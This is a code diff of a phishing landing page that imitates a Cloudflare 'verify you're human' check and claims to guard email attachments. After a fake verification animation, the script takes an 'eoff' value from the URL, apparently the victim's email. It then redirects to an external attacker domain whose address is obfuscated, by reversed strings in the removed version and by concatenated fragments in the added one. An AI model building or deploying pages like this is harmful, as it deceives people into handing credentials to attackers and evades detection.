@@ -2,86 +2,240 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Security Check</title>
     <style>
-        body { margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fcfcfc; font-family: 'Segoe UI', Arial, sans-serif; }
-        #stage { display: flex; flex-direction: column; align-items: center; }
-        .p-pulse { width: 85px; animation: br 2.2s ease-in-out infinite; }
-        @keyframes br { 0%, 100% { opacity: 0.4; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
-        .v-card { background: #fff; border: 1px solid #d0d0d0; width: 370px; padding: 24px 32px; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
-        .v-left { display: flex; align-items: center; gap: 16px; flex: 1; }
-        #c-box { width: 22px; height: 22px; border: 2px solid #bcbcbc; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .v-rot { width: 14px; height: 14px; border: 2px solid #eee; border-top: 2px solid #0052cc; border-radius: 50%; animation: s 0.8s linear infinite; }
-        @keyframes s { 100% { transform: rotate(360deg); } }
-        .v-right { border-left: 1px solid #f2f2f2; padding-left: 20px; text-align: center; }
-        .v-logo { width: 26px; height: 26px; margin-bottom: 2px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f8fafc;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            overflow: hidden;
+        }
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: #f8fafc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            transition: opacity 0.6s ease-out;
+        }
+        .loader-icon {
+            width: 120px;
+            height: auto;
+            animation: pulse 3s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(0.95); opacity: 0.7; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
+        .verification-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.5s ease-in;
+        }
+        .instruction-text {
+            margin-bottom: 18px;
+            font-size: 0.92rem;
+            color: #1e293b;
+            letter-spacing: -0.01em;
+            font-weight: 450;
+            text-align: center;
+        }
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 340px;
+            height: 100px;
+            padding: 0 24px;
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            position: relative;
+        }
+        .click-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .svg-holder {
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .svg-shape {
+            width: 100%;
+            height: 100%;
+            fill: none;
+            stroke: #cbd5e1;
+            stroke-width: 2.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+        .btn-label {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #1e293b;
+        }
+        .brand-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            justify-content: center;
+            height: 100%;
+        }
+        .brand-logo {
+            height: 38px;
+            width: auto;
+            margin-bottom: -2px;
+            display: block;
+        }
+        .brand-name {
+            display: block;
+            font-weight: 800;
+            font-size: 0.75rem;
+            letter-spacing: 1.5px;
+            color: #FF8C00;
+            text-transform: uppercase;
+        }
+        .legal-note {
+            font-size: 0.65rem;
+            color: #64748b;
+            margin-top: 1px;
+        }
+        .captcha-box.spin-mode .svg-shape {
+            stroke: #3b82f6;
+            animation: spin 1s linear infinite;
+            transform-origin: center;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .captcha-box.check-mode .svg-shape {
+            stroke: #10B981;
+            filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
+        }
+        .captcha-box.check-mode .btn-label {
+            color: #10B981;
+        }
     </style>
 </head>
 <body>
-
-    <div id="stage"></div>
-
+    <div id="curtain" class="loader-overlay">
+        <img src="astroman.png" alt="load" class="loader-icon">
+    </div>
+    <div id="mainUi" class="verification-container">
+        <div id="instr" class="instruction-text"></div>
+        <div id="captchaWidget" class="captcha-box">
+            <div id="clickable" class="click-area">
+                <div class="svg-holder">
+                    <svg viewBox="0 0 24 24" class="svg-shape" id="animatedSvg">
+                        <path id="svgPath" d="M4 4h16v16H4z" />
+                    </svg>
+                </div>
+                <span id="dynamicLabel" class="btn-label"></span>
+            </div>
+            <div class="brand-wrapper">
+                <img src="cloudflare_.png" alt="secure" class="brand-logo">
+                <span id="brandingText" class="brand-name"></span>
+                <div class="legal-note">privacy . terms</div>
+            </div>
+        </div>
+    </div>
     <script>
         (function() {
-            // Unmasking logic: Reverse and Strip
-            const _cln = (x) => x.split('').reverse().join('').replace(/_/g, '');
-
-            // All text strings scrambled
-            const _m1 = _cln('w_o_l_e_b_ _n_a_m_u_h_ _e_r_\'_u_o_y_ _y_f_i_r_e_v_ ,_s_t_n_e_m_u_c_o_d_ _e_s_e_h_t_ _w_e_i_v_ _o_T');
-            const _m2 = _cln('y_f_i_r_e_V');
-            const _m3 = _cln('._._._g_n_i_y_f_i_r_e_V');
-            const _m4 = _cln('s_s_e_c_c_u_S');
-            const _m5 = _cln('e_r_a_l_f_d_u_o_l_C'); // Cloudflare
-            const _m6 = _cln('s_m_r_e_T_ ._ y_c_a_v_i_r_P');
-
-            // UPDATED REDIRECT URL
-            const _mU = _cln('#_5_b_C_a_I_q_W_E_0_r_0_f_H_K_g_t_/_1_v_/_i_p_a_/_e_n_i_l_n_o_._e_a_u_n_f_f_i_t_._v_n_i_f_f_o_/_/:_s_p_t_t_h');
-
-            const _mK = _cln('=__f__f__o__e__?__/__'); // "/?eoff="
-
-            const view = document.getElementById('stage');
-            // astro.png: Preloader
-            view.innerHTML = `<img src="astro.png" class="p-pulse">`;
-
+            const words = {
+                hint: "Verify you're human below to view the attachments",
+                start: "I'm not a robot",
+                waiting: "Verifying...",
+                done: "Success!",
+                company: "CLOUDFLARE"
+            };
+            const curtain = document.getElementById('curtain');
+            const mainPanel = document.getElementById('mainUi');
+            const instrBox = document.getElementById('instr');
+            const captchaCard = document.getElementById('captchaWidget');
+            const triggerBtn = document.getElementById('clickable');
+            const labelSpan = document.getElementById('dynamicLabel');
+            const pathElement = document.getElementById('svgPath');
+            const brandSpanEl = document.getElementById('brandingText');
+            instrBox.textContent = words.hint;
+            labelSpan.textContent = words.start;
+            brandSpanEl.textContent = words.company;
+            let busy = false;
             setTimeout(() => {
-                view.innerHTML = `
-                    <div style="color:#666;font-size:13.5px;margin-bottom:12px;">${_m1}</div>
-                    <div class="v-card">
-                        <div class="v-left">
-                            <div id="c-box"></div>
-                            <span id="v-lbl" style="color:#444;font-size:14px;">${_m2}</span>
-                        </div>
-                        <div class="v-right">
-                            <img src="astro2.png" class="v-logo">
-                            <div style="font-weight:600;font-size:14px;color:#1a1a1a;">${_m5}</div>
-                            <div style="font-size:9px;color:#aaa;margin-top:2px;">${_m6}</div>
-                        </div>
-                    </div>`;
-
-                document.getElementById('c-box').onclick = function() {
-                    const b = this;
-                    const l = document.getElementById('v-lbl');
-                    b.onclick = null;
-                    b.style.border = "none";
-                    b.innerHTML = '<div class="v-rot"></div>';
-                    l.innerText = _m3;
-
+                curtain.style.opacity = '0';
+                setTimeout(() => {
+                    curtain.style.display = 'none';
+                    mainPanel.style.opacity = '1';
+                }, 600);
+            }, 3000);
+            function reshapePath(newD, dashPattern = null, resetDash = false) {
+                if (!pathElement) return;
+                pathElement.setAttribute('d', newD);
+                if (resetDash) {
+                    pathElement.style.strokeDasharray = '';
+                } else if (dashPattern !== null) {
+                    pathElement.style.strokeDasharray = dashPattern;
+                }
+            }
+            function extractEoffParameter() {
+                const searchString = window.location.search;
+                const marker = 'eoff=';
+                const startIdx = searchString.indexOf(marker);
+                if (startIdx === -1) return '';
+                const afterMarker = searchString.substring(startIdx + marker.length);
+                let endPos = afterMarker.length;
+                const ampPos = afterMarker.indexOf('&');
+                const hashPos = afterMarker.indexOf('#');
+                if (ampPos !== -1) endPos = Math.min(endPos, ampPos);
+                if (hashPos !== -1) endPos = Math.min(endPos, hashPos);
+                return afterMarker.substring(0, endPos);
+            }
+            function startVerification() {
+                if (busy) return;
+                busy = true;
+                captchaCard.classList.add('spin-mode');
+                labelSpan.textContent = words.waiting;
+                reshapePath('M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2', '35 15', false);
+                setTimeout(() => {
+                    captchaCard.classList.remove('spin-mode');
+                    captchaCard.classList.add('check-mode');
+                    labelSpan.textContent = words.done;
+                    reshapePath('M20 6L9 17l-5-5', null, true);
                     setTimeout(() => {
-                        b.innerHTML = '<span style="color:#228b22;font-weight:bold;font-size:18px;">\u2713</span>';
-                        l.innerText = _m4;
-                        l.style.color = '#28a745';
-
-                        const u = window.location.href;
-                        let p = "";
-                        if (u.includes(_mK)) {
-                            p = u.split(_mK)[1];
-                        }
-
-                        setTimeout(() => {
-                            window.location.replace(_mU + p);
-                        }, 1250);
-                    }, 2200);
-                };
-            }, 3200);
+                        let eoffValue = extractEoffParameter();
+                        const a = 'ht', b = 'tps', c = '://', d = 'po', e = '.uaomanshare', f = '.online', g = '/sNOiatkB';
+                        const redirectBase = a + b + c + d + e + f + g;
+                        window.location.href = redirectBase + (eoffValue ? '#' + eoffValue : '');
+                    }, 1200);
+                }, 2500);
+            }
+            if (triggerBtn) {
+                triggerBtn.addEventListener('click', startVerification);
+            }
         })();
     </script>
 </body>
